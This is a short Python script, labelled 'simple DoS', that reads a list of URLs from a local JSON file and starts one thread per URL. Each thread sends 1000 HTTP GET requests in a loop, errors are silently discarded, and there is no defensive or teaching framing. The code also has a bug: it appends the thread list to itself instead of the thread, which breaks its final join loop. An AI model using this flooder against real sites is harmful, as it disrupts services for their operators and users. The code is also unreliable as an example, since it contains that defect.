#!/usr/local/python3
# simple DoS
import sys, os, time, requests
import threading

from cachetools import Cache;
sys.path.insert(0, os.path.abspath("./"));

from api.data import *;


js = JsonHelp();
links = js.load(os.path.abspath("./") + "/data/stage00.json");

def request_dos(link):
    try:
        for i in range(1000):
            page = requests.get(link);
            print(page.status_code, link);
    except:
        lixo = "";

ts = [];
for link in links:
    x = threading.Thread(target=request_dos, args=(link,));
    ts.append(ts);
    x.start();
    
for t in ts:
    t.join();
    
